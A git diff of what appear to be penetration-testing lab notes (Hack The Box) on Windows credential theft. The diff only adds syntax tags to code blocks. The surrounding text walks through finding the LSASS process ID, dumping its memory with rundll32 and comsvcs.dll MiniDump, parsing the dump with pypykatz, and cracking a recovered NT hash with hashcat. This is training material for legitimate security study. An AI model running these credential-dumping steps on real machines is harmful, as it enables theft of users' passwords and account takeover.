@@ -29,7 +29,7 @@ Before issuing the command to create the dump file, we must determine what proce
 #### Finding LSASS's PID in cmd
 
 From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.
-```
+```PowerShell
 C:\Windows\system32> tasklist /svc
 
 Image Name                     PID Services
@@ -41,7 +41,7 @@ lsass.exe                      672 KeyIso, SamSs, VaultSvc
 
 From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.
 
-```
+```PowerShell
 PS C:\Windows\system32> Get-Process lsass
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -51,7 +51,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 #### Creating a dump file using PowerShell
 With an elevated PowerShell session, we can issue the following command to create a dump file:
-```
+```PowerShell
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 
 C:\lsass.dmp full
 ```
@@ -68,7 +68,7 @@ Once we have the dump file on our attack host, we can use a powerful tool called
 
 The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:
 
-```
+```PowerShell
 tylapcheong@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
 
@@ -97,7 +97,7 @@ Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users wh
 
 We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
 
-```
+```Bash
 tylapcheong@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
